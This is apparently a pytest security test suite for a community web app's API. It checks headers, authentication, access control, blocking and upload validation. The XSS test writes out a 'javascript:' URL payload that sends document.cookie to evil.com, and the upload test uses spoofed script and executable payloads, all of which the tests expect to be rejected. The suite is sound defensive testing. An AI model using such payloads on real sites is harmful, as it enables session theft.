import io
import uuid
import pytest
from sqlalchemy import select
from app.core.security import create_access_token
from app.models.user import User, UserBlock
from app.models.event import Event, EventRegistration
from app.models.circle import InterestCircle, CircleMembership
from app.models.opportunity import Opportunity
from app.core.rate_limit import _limiter

def test_security_headers_and_server_redaction(client):
    res = client.get("/health")
    assert res.status_code == 200
    headers = res.headers
    assert headers.get("x-content-type-options") == "nosniff"
    assert headers.get("x-frame-options") == "DENY"
    assert headers.get("x-xss-protection") == "1; mode=block"
    assert headers.get("referrer-policy") == "strict-origin-when-cross-origin"
    assert "permissions-policy" in headers
    assert "content-security-policy" in headers
    assert "server" not in headers

def test_weak_password_rejected(client):
    res = client.post("/api/v1/auth/register", json={
        "name": "Weak Pass User",
        "email": f"weak_{uuid.uuid4().hex[:8]}@example.com",
        "password": "password123"
    })
    assert res.status_code == 400
    assert "too common" in res.json().get("detail", "").lower()

def test_tampered_token_rejected(client):
    # Tampered signature
    res = client.get("/api/v1/auth/me", headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.e30.tampered_signature"})
    assert res.status_code == 401

def test_two_user_isolation_email_and_location(client, db):
    u1_email = f"user1_{uuid.uuid4().hex[:8]}@example.com"
    u2_email = f"user2_{uuid.uuid4().hex[:8]}@example.com"

    r1 = client.post("/api/v1/auth/register", json={"name": "Alice User", "email": u1_email, "password": "StrongPassword123!"})
    r2 = client.post("/api/v1/auth/register", json={"name": "Bob User", "email": u2_email, "password": "StrongPassword123!"})
    u1_id = r1.json()["id"]
    u2_id = r2.json()["id"]

    t1 = client.post("/api/v1/auth/login", json={"email": u1_email, "password": "StrongPassword123!"}).json()["access_token"]
    t2 = client.post("/api/v1/auth/login", json={"email": u2_email, "password": "StrongPassword123!"}).json()["access_token"]

    # Alice views Bob's profile -> Bob's email MUST NOT be disclosed
    res_peer = client.get(f"/api/v1/users/{u2_id}", headers={"Authorization": f"Bearer {t1}"})
    assert res_peer.status_code == 200
    assert res_peer.json().get("email") is None

    # Bob views his own profile -> email is disclosed
    res_self = client.get(f"/api/v1/users/{u2_id}", headers={"Authorization": f"Bearer {t2}"})
    assert res_self.status_code == 200
    assert res_self.json().get("email") == u2_email

def test_event_cancellation_bola_idor_prevention(client, db):
    u1_email = f"attendee1_{uuid.uuid4().hex[:8]}@example.com"
    u2_email = f"attacker2_{uuid.uuid4().hex[:8]}@example.com"

    r1 = client.post("/api/v1/auth/register", json={"name": "Attendee One", "email": u1_email, "password": "StrongPassword123!"})
    r2 = client.post("/api/v1/auth/register", json={"name": "Attacker Two", "email": u2_email, "password": "StrongPassword123!"})
    u1_id = r1.json()["id"]

    t1 = client.post("/api/v1/auth/login", json={"email": u1_email, "password": "StrongPassword123!"}).json()["access_token"]
    t2 = client.post("/api/v1/auth/login", json={"email": u2_email, "password": "StrongPassword123!"}).json()["access_token"]

    # Create an event
    evt = Event(title="Exclusive AI Summit", description="Testing BOLA prevention", location="Pune", created_by_id=u1_id)
    db.add(evt)
    db.commit()
    db.refresh(evt)

    # Register Attendee One
    reg = EventRegistration(event_id=evt.id, user_id=u1_id, status="registered")
    db.add(reg)
    db.commit()

    # Attacker Two attempts to cancel Attendee One's registration by passing their email
    cancel_attempt = client.post(
        f"/api/v1/events/{evt.id}/cancel?email={u1_email}",
        headers={"Authorization": f"Bearer {t2}"}
    )
    # Must be rejected with 403 Forbidden
    assert cancel_attempt.status_code == 403

    # Registration must remain intact
    still_reg = db.scalar(select(EventRegistration).where(EventRegistration.event_id == evt.id, EventRegistration.user_id == u1_id))
    assert still_reg is not None

def test_blocked_users_cannot_message(client, db):
    u1_email = f"blocker_{uuid.uuid4().hex[:8]}@example.com"
    u2_email = f"blocked_{uuid.uuid4().hex[:8]}@example.com"

    r1 = client.post("/api/v1/auth/register", json={"name": "Blocker User", "email": u1_email, "password": "StrongPassword123!"})
    r2 = client.post("/api/v1/auth/register", json={"name": "Blocked User", "email": u2_email, "password": "StrongPassword123!"})
    u1_id = r1.json()["id"]
    u2_id = r2.json()["id"]

    t2 = client.post("/api/v1/auth/login", json={"email": u2_email, "password": "StrongPassword123!"}).json()["access_token"]

    # Insert block relationship
    block = UserBlock(blocker_id=u1_id, blocked_user_id=u2_id)
    db.add(block)
    db.commit()

    # Blocked user attempts to message blocker
    msg_res = client.post("/api/v1/messages", json={
        "receiver_id": u1_id,
        "content": "Hey, why did you block me?"
    }, headers={"Authorization": f"Bearer {t2}"})

    assert msg_res.status_code == 403
    assert "block" in msg_res.json().get("detail", "").lower()

def test_private_circle_access_control(client, db):
    u1_email = f"circle_owner_{uuid.uuid4().hex[:8]}@example.com"
    u2_email = f"circle_stranger_{uuid.uuid4().hex[:8]}@example.com"

    r1 = client.post("/api/v1/auth/register", json={"name": "Circle Owner", "email": u1_email, "password": "StrongPassword123!"})
    r2 = client.post("/api/v1/auth/register", json={"name": "Circle Stranger", "email": u2_email, "password": "StrongPassword123!"})
    u1_id = r1.json()["id"]

    t2 = client.post("/api/v1/auth/login", json={"email": u2_email, "password": "StrongPassword123!"}).json()["access_token"]

    # Create private circle
    circle = InterestCircle(
        name="Private Founders Circle",
        description="Confidential founders mastermind group",
        is_private=True,
        created_by_id=u1_id
    )
    db.add(circle)
    db.commit()
    db.refresh(circle)

    # Non-member attempts to post a discussion
    disc_res = client.post(
        f"/api/v1/circles/{circle.id}/discussions",
        json={"title": "Spam topic", "content": "Selling products here"},
        headers={"Authorization": f"Bearer {t2}"}
    )
    assert disc_res.status_code == 403
    assert "member" in disc_res.json().get("detail", "").lower()

def test_admin_route_protection_and_rbac(client, db):
    u_email = f"regular_user_{uuid.uuid4().hex[:8]}@example.com"
    r = client.post("/api/v1/auth/register", json={"name": "Regular User", "email": u_email, "password": "StrongPassword123!"})
    token = client.post("/api/v1/auth/login", json={"email": u_email, "password": "StrongPassword123!"}).json()["access_token"]
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Anonymous attempts -> 401
    assert client.post("/api/v1/events/purge-dummy").status_code == 401
    assert client.post("/api/v1/events/sync/eventbrite").status_code == 401
    assert client.post("/api/v1/opportunities/deactivate-expired").status_code == 401
    assert client.post("/api/v1/opportunities/sync/kaggle").status_code == 401

    # 2. Non-admin authenticated user -> 403
    assert client.post("/api/v1/events/purge-dummy", headers=headers).status_code == 403
    assert client.post("/api/v1/events/sync/eventbrite", headers=headers).status_code == 403
    assert client.post("/api/v1/opportunities/deactivate-expired", headers=headers).status_code == 403
    assert client.post("/api/v1/opportunities/sync/kaggle", headers=headers).status_code == 403

def test_url_scheme_stored_xss_neutralized(client, db):
    u_email = f"creator_{uuid.uuid4().hex[:8]}@example.com"
    client.post("/api/v1/auth/register", json={"name": "Creator", "email": u_email, "password": "StrongPassword123!"})
    token = client.post("/api/v1/auth/login", json={"email": u_email, "password": "StrongPassword123!"}).json()["access_token"]
    headers = {"Authorization": f"Bearer {token}"}

    # Malicious javascript: URL in Project github_repo_url must be rejected by Pydantic schema validation
    xss_project = {
        "title": "Malicious Project",
        "description": "Attempting stored XSS via javascript URL",
        "github_repo_url": "javascript:alert(document.domain)"
    }
    res = client.post("/api/v1/projects", json=xss_project, headers=headers)
    assert res.status_code == 422

    # Malicious javascript: URL in Opportunity apply_url must be rejected
    xss_opp = {
        "title": "Hacker Hackathon",
        "organization": "Evil Org",
        "description": "Win prizes while we steal your session",
        "apply_url": "javascript:fetch('//evil.com/?cookie='+document.cookie)"
    }
    res_opp = client.post("/api/v1/opportunities", json=xss_opp, headers=headers)
    assert res_opp.status_code == 422

def test_file_upload_validation_and_spoofing(client):
    u_email = f"uploader_{uuid.uuid4().hex[:8]}@example.com"
    client.post("/api/v1/auth/register", json={"name": "Uploader", "email": u_email, "password": "StrongPassword123!"})
    token = client.post("/api/v1/auth/login", json={"email": u_email, "password": "StrongPassword123!"}).json()["access_token"]
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Executable file extension / unsupported MIME rejected
    bad_file = ("malware.exe", io.BytesIO(b"MZ\x90\x00\x03\x00\x00\x00"), "application/x-msdownload")
    res = client.post("/api/v1/uploads", files={"file": bad_file}, headers=headers)
    assert res.status_code == 400

    # 2. Magic bytes mismatch (declared JPEG, but payload is plain text script)
    spoofed_file = ("photo.jpg", io.BytesIO(b"<script>alert(1)</script>"), "image/jpeg")
    res2 = client.post("/api/v1/uploads", files={"file": spoofed_file}, headers=headers)
    assert res2.status_code == 400
    assert "spoofing" in res2.json().get("detail", "").lower()
